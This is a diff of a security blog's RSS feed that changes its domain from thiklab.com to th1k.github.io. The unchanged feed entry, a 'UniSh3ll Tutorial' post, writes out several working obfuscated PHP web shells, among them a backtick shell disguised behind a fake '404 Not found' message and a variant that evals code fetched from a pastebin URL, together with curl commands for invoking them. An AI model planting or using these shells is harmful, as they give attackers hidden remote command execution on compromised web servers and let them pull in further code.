@@ -7,7 +7,7 @@
   xmlns:media="http://search.yahoo.com/mrss/">
   <channel>
     <title>WebShell on ThikLab - CyberSec</title>
-    <link>https://thiklab.com/en/categories/webshell/</link>
+    <link>https://th1k.github.io/en/categories/webshell/</link>
     <description>Recent content in WebShell on ThikLab - CyberSec</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
@@ -16,23 +16,23 @@
     <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2023 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
     <lastBuildDate>Tue, 26 May 2020 14:28:44 +0700</lastBuildDate>
     
-        <atom:link href="https://thiklab.com/en/categories/webshell/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="https://th1k.github.io/en/categories/webshell/index.xml" rel="self" type="application/rss+xml" />
     
 
       
       <item>
         <title>UniSh3ll Tutorial</title>
-        <link>https://thiklab.com/en/posts/unishell/</link>
+        <link>https://th1k.github.io/en/posts/unishell/</link>
         <pubDate>Tue, 26 May 2020 14:28:44 +0700</pubDate>
         <author>thiklife403@gmail.com (Thik)</author>
         <atom:modified>Tue, 26 May 2020 14:28:44 +0700</atom:modified>
-        <guid>https://thiklab.com/en/posts/unishell/</guid>
+        <guid>https://th1k.github.io/en/posts/unishell/</guid>
         <description>UniSh3ll-I 1  &amp;lt;?=$_=$_GET;$_[_]($_[0]); //.php?_=system&amp;amp;0=id;ls+-la    UniSh3ll-II 1  echo -e &amp;#34;&amp;lt;?=\`\$_REQUEST[_]\`?&amp;gt;&amp;#34; &amp;gt; unish3ll.php   1  echo -e &amp;#34;&amp;lt;?=\`\$_REQUEST[_]\`?&amp;gt;\r&amp;lt;?=&amp;#39;404 Not found&amp;#39;;?&amp;gt;&amp;#34; &amp;gt; unish3ll.php   របៀបប្រើ៖ curl localhost/unish3ll.php -d _=ls+-la
 UniSh3ll-III 1  &amp;lt;?=$ឋ=$_GET;if($ឋ[ត]!=null)$ឋ[ល]==រងារ&amp;amp;$ឋ[ម]($ឋ[ប]); //.php?ត=true&amp;amp;ល=រងារ&amp;amp;ម=passthru&amp;amp;ប=ls    1  &amp;lt;?=$ឋ=$_GET;if($ឋ[ត]!=null)$ឋ[ល]==រងារ&amp;amp;$ឋ[ម]($ឋ[ប]); eval(&amp;#39;?&amp;gt;&amp;#39;.file_get_contents($ឋ[ដ]));?&amp;gt;   របៀបប្រើ៖ unish3ll.php?ត=true&amp;amp;ល=រងារ&amp;amp;ម=passthru&amp;amp;ប=id&amp;amp;ដ=https://pastebin.com/raw/xxxxx
 UniSh3ll-IV 1  &amp;lt;?=$a=&amp;#34;sy&amp;#34;;$b=&amp;#34;stem&amp;#34;;$c=$a.$b; $c(&amp;#34;uname -a&amp;#34;); //get method    UniSh3ll-V 1  &amp;lt;?=$_[]=@(($ក=@$_REQUEST).($😘=@$ក[0]).($😘($ក[1]))); //curl -v &amp;#39;127.0.0.1:8080/unish3ll.php?0=system&amp;amp;1=la+-la&amp;#39;    </description>
         
         <dc:creator>thik</dc:creator>
-        <media:content url="https://thiklab.comimages/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        <media:content url="https://th1k.github.ioimages/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
         
         
         
